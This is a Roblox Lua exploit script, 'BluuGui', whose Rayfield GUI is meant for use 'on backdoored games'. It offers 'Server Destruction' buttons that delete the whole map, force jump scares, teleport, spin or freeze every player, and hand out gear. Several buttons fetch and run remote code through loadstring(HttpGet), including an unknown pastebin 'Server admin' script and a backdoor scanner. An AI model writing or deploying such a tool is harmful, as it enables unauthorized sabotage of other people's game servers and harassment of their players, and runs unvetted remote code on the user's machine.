local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "BluuGui Server side scripts",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "Use on backdoored games!",
   LoadingSubtitle = "by 118o8",
   ShowText = "BluuGui (FE)", -- for mobile users to unhide rayfield, change if you'd like
   Theme = "Ocean", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   ToggleUIKeybind = "B", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

Rayfield:Notify({
   Title = "BluuGui executed!",
   Content = "Enjoy making chaos >:D",
   Duration = 3.5,
   Image = 4483362458,
})

local Server = Window:CreateTab("Server Manegament", 4483362458) -- Title, Image

local Section = Server:CreateSection("Bluudud favorites")

local Button = Server:CreateButton({
   Name = "BluuWord",
   Callback = function()
  local Lighting = game:GetService("Lighting")

-- Function to check if a part should be colored
local function isMapPart(part)
    return part:IsA("BasePart") and part.Anchored
end

-- Function to set a part to blue scale
local function setBlueScale(part)
    local original = part.Color
    local brightness = (original.r + original.g + original.b)/3
    part.Color = Color3.new(0, 0, brightness)
end

-- Function to color all parts in the workspace
local function colorMapBlue()
    for _, obj in pairs(workspace:GetDescendants()) do
        if isMapPart(obj) then
            setBlueScale(obj)
        end
    end
end

-- Function to change the sky
local function setBlueSky()
    if Lighting:FindFirstChildOfClass("Sky") then
        Lighting:FindFirstChildOfClass("Sky"):Destroy()
    end

    local sky = Instance.new("Sky")
    sky.Name = "BlueSky"

    -- Replace these with your blue-themed asset IDs
    sky.SkyboxBk = "rbxassetid://1234567890"
    sky.SkyboxDn = "rbxassetid://1234567891"
    sky.SkyboxFt = "rbxassetid://1234567892"
    sky.SkyboxLf = "rbxassetid://1234567893"
    sky.SkyboxRt = "rbxassetid://1234567894"
    sky.SkyboxUp = "rbxassetid://1234567895"

    sky.Parent = Lighting
end

-- Execute immediately
colorMapBlue()
setBlueSky()

   end,
})


local Button = Server:CreateButton({
   Name = "Jump Scare (Very scary)",
   Callback = function()
   -- Jump Scare Luau

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Crear el ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "JumpScareGui"
screenGui.Parent = playerGui

-- Crear la imagen
local imageLabel = Instance.new("ImageLabel")
imageLabel.Size = UDim2.new(1,0,1,0)
imageLabel.Position = UDim2.new(0,0,0,0)
imageLabel.Image = "rbxassetid://7600505808" -- ID de la imagen
imageLabel.BackgroundTransparency = 1
imageLabel.Visible = false
imageLabel.Parent = screenGui

-- Crear el sonido
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://134659166665541" -- ID del sonido
sound.Parent = imageLabel

-- Función para mostrar el jump scare
local function mostrarJumpScare()
    imageLabel.Visible = true
    sound:Play()
    wait(3) -- Espera 3 segundos
    imageLabel.Visible = false
end

-- Activar el jump scare al cargar
wait(2) -- Espera 2 segundos antes de mostrar
mostrarJumpScare()

   end,
})   

local Button = Server:CreateButton({
   Name = "Play music!",
   Callback = function()
   local SoundService = game:GetService("SoundService")

-- Create the sound
local music = Instance.new("Sound")
music.SoundId = "rbxassetid://35930009" -- Replace with your music asset
music.Volume = 5
music.Looped = true -- Set to false if you want it to play once
music.Playing = true
music.Parent = SoundService

-- Optional: adjust other properties
music.MaxDistance = 1000
music.EmitterSize = 50

   end,
})

local Button = Server:CreateButton({
   Name = "Bluu Party!",
   Callback = function()
   local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Replace this with the Animation ID for "Monster Smash Go"
local animationId = "rbxassetid://35654637"

-- Function to play animation on a character
local function playDance(character)
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        -- Create the animation
        local danceAnim = Instance.new("Animation")
        danceAnim.AnimationId = animationId

        -- Load and play
        local track = humanoid:LoadAnimation(danceAnim)
        track.Priority = Enum.AnimationPriority.Action
        track:Play()
    end
end

-- Play for all existing players
for _, player in pairs(Players:GetPlayers()) do
    if player.Character then
        playDance(player.Character)
    end
end

-- Play for new players when they join
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        -- Small delay to ensure Humanoid exists
        wait(1)
        playDance(character)
    end)
end)

-- Optional: repeat for existing characters respawning
for _, player in pairs(Players:GetPlayers()) do
    player.CharacterAdded:Connect(function(character)
        wait(1)
        playDance(character)
    end)
end

   end,
})


-- Dropdown list of Gear IDs
local GearDropdown = Server:CreateDropdown({
    Name = "Select Gear",
    Options = {
        "97885508", -- Replace with actual Gear IDs
        "78730532",
        "11450664"
    },
    CurrentOption = "97885508",
    Flag = "SelectedGear",
    Callback = function(option)
        print("Selected Gear ID:", option)
    end
})

local InsertService = game:GetService("InsertService")
local Players = game:GetService("Players")

-- Function to give gear to a player
local function giveGear(player, gearId)
    local success, asset = pcall(function()
        return InsertService:LoadAsset(tonumber(gearId))
    end)
    
    if success and asset then
        for _, obj in pairs(asset:GetChildren()) do
            if obj:IsA("Tool") then
                obj.Parent = player:FindFirstChildOfClass("Backpack")
                break
            end
        end
    end
end

-- Button to give gear to yourself
Server:CreateButton({
    Name = "Get Gear",
    Callback = function()
        local gearId = Rayfield.Flags.SelectedGear
        giveGear(Players.LocalPlayer, gearId)
    end
})

-- Button to give gear to all players
Server:CreateButton({
    Name = "Give Gear to All",
    Callback = function()
        local gearId = Rayfield.Flags.SelectedGear
        for _, player in pairs(Players:GetPlayers()) do
            giveGear(player, gearId)
        end
    end
})



local desc = Server:CreateSection("Server Destruction >:D")

local Button = Server:CreateButton({
   Name = "Nuke map",
   Callback = function()
   local Workspace = game:GetService("Workspace")

-- List of objects we don't want to delete
local protectedObjects = {
    "Terrain", 
    "Camera"
}

-- Function to check if an object is protected
local function isProtected(obj)
    for _, name in pairs(protectedObjects) do
        if obj.Name == name then
            return true
        end
    end
    return false
end

-- Delete all other objects
for _, obj in pairs(Workspace:GetChildren()) do
    if not isProtected(obj) then
        obj:Destroy()
    end
end

   end,
})

local Button = Server:CreateButton({
   Name = "Server admin",
   Callback = function()
            
loadstring(game:HttpGet("https://pastebin.com/raw/xuy7gHRj"))()
   
        end,
})

local Button = Server:CreateButton({
   Name = "No gravity",
   Callback = function()
   -- No Gravity Server Script
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Toggle for no gravity
local noGravity = true
local gravityValue = 0 -- Set to 0 for no gravity
local normalGravity = workspace.Gravity

-- Function to apply no gravity to a player's character
local function disableGravity(character)
    if not character then return end
    local hrp = character:FindFirstChild("HumanoidRootPart")
    local hum = character:FindFirstChildOfClass("Humanoid")
    if hrp and hum then
        -- Set platform stand so players float
        hum.PlatformStand = true
    end
end

-- Function to reset gravity for a character
local function enableGravity(character)
    if not character then return end
    local hum = character:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.PlatformStand = false
    end
end

-- Apply no gravity to all players
local function applyNoGravity()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character then
            disableGravity(player.Character)
        end
    end
end

-- Reset gravity for all players
local function resetGravity()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character then
            enableGravity(player.Character)
        end
    end
end

-- Toggle handler
RunService.Heartbeat:Connect(function()
    if noGravity then
        applyNoGravity()
    else
        resetGravity()
    end
end)

-- Handle new players
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(char)
        if noGravity then
            disableGravity(char)
        end
    end)
end)

-- Optional: toggle gravity with a command
game:GetService("ReplicatedStorage"):WaitForChild("ToggleNoGravityEvent").OnServerEvent:Connect(function()
    noGravity = not noGravity
    if noGravity then
        print("🌌 No Gravity ENABLED!")
    else
        print("🌍 Gravity RESTORED!")
    end
end)

   end,
})

local Button = Server:CreateButton({
   Name = "Tp players to random point",
   Callback = function()
   -- Teleport all players to random positions
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

-- Define the bounds for random teleport
local minX, maxX = -100, 100
local minY, maxY = 10, 50   -- Y should be above the ground
local minZ, maxZ = -100, 100

-- Function to teleport a single player
local function teleportPlayer(player)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = player.Character.HumanoidRootPart
        local randomPosition = Vector3.new(
            math.random(minX, maxX),
            math.random(minY, maxY),
            math.random(minZ, maxZ)
        )
        hrp.CFrame = CFrame.new(randomPosition)
    end
end

-- Teleport all players
for _, player in pairs(Players:GetPlayers()) do
    teleportPlayer(player)
end

print("🌪 All players have been teleported to random positions!")

   end,
})

local Button = Server:CreateButton({
   Name = "Bring all",
   Callback = function()
   -- Bring all players to executor
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer  -- the executor
local Workspace = game:GetService("Workspace")

-- Get executor's position
local executorCharacter = LocalPlayer.Character
if not executorCharacter or not executorCharacter:FindFirstChild("HumanoidRootPart") then
    warn("Executor character not found!")
    return
end
local executorPos = executorCharacter.HumanoidRootPart.Position

-- Function to bring a player
local function bringPlayer(player)
    if player == LocalPlayer then return end -- skip executor
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(executorPos)
    end
end

-- Bring all players
for _, player in pairs(Players:GetPlayers()) do
    bringPlayer(player)
end

print("📌 All players brought to executor!")

   end,
})

local Button = Server:CreateButton({
   Name = "Spin all",
   Callback = function()
   local Players = game:GetService("Players")
local SpinDuration = 5       -- how long to spin (seconds)
local SpinSpeed = 10         -- degrees per frame

local function spinCharacter(character)
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if rootPart then
        -- Create a BodyAngularVelocity to spin
        local bav = Instance.new("BodyAngularVelocity")
        bav.AngularVelocity = Vector3.new(0, math.rad(SpinSpeed), 0)
        bav.MaxTorque = Vector3.new(0, math.huge, 0)
        bav.P = 1250
        bav.Parent = rootPart

        -- Remove after SpinDuration
        game.Debris:AddItem(bav, SpinDuration)
    end
end

local function spinAllPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            spinCharacter(player.Character)
        end
    end
end

-- Spin all now
spinAllPlayers()

-- Also spin players who respawn during spin time
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(char)
        spinCharacter(char)
    end)
end)

   end,
})

local Section = Server:CreateSection("Backdoors scaners")

local Button = Server:CreateButton({
   Name = "LALOL",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script"))()

            Rayfield:Notify({
   Title = "LALOL scaner executed",
   Content = "Good Luck :3",
   Duration = 2.3,
   Image = 4483362458,
})
   end,
})
